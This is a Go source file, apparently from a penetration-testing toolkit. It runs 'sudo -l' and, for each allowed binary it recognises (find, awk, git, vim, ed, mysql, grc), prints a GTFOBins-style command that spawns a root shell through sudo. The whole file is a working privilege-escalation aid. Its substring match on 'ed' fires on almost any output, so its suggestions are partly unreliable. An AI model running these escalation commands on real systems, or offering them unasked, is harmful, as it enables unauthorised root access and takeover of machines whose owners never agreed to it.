package privilege_check

import (
	"fmt"
	"os/exec"
	"strings"
)

func SUDO_Check() {
	fmt.Println("SUDO privilege checking...")
	cmd := exec.Command("sudo", "-l")
	result, err := cmd.CombinedOutput()
	if err != nil {
		return
	}
	fmt.Println("sudo privilege checking result:")
	sudo_check(string(result))
}

// https://gtfobins.github.io
func sudo_check(result string) {
	if strings.Contains(result, "find") {
		fmt.Println("find sudo_use:sudo find 1 -exec whoami  or sudo find 1 -exec /bin/sh")
	}
	if strings.Contains(result, "awk") {
		fmt.Println("awk sudo_use:sudo awk 'BEGIN{system(\"whoami\")}' or sudo awk 'BEGIN{system(\"/bin/bash\")}'")
	}
	if strings.Contains(result, "git") {
		fmt.Println("git sudo_use:sudo git help add; and then !/bin/bash")
	}
	if strings.Contains(result, "vim") {
		fmt.Println("vim sudo_use:sudo vim /etc/passwd; and then !/bin/bash")
	}
	if strings.Contains(result, "ed") {
		fmt.Println("ed sudo_use:sudo ed; and then !/bin/bash")
	}
	if strings.Contains(result, "mysql") {
		fmt.Println("mysql sudo_use:sudo mysql -e \"\\! whoami\" or sudo mysql -e \"\\! /bin/bash\"")
	}
	if strings.Contains(result, "grc") {
		fmt.Println("grc sudo_use:sudo grc --pty /bin/bash")
	}
}
